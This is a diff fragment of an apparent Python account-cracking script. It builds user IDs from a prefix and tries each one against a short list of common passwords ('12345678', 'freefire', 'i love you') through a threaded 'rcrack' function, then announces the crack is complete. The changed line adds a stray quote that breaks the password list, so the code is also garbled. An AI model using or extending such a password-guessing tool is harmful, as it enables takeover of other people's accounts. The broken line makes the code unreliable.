@@ -201,7 +201,7 @@ def nahid_afridy():
         os.system('espeak -a 300 "Wait for 5 minutes"')
         print('')
         for love in user:
-            pwx = [love, 'bangladesh', 'i love you','@@@###','freefire','12345678','free fire','Bangladesh']
+            pwx = ['love, 'bangladesh', 'i love you','@@@###','freefire','12345678','free fire','Bangladesh']
             uid = code+love
             manshera.submit(rcrack,uid,pwx,tl)
     print('\033[38;5;46m[\033[38;5;46m✔︎\033[38;5;46m]\033[38;5;46mCRACK PROCESS HAS BEEN COMPLETED ')
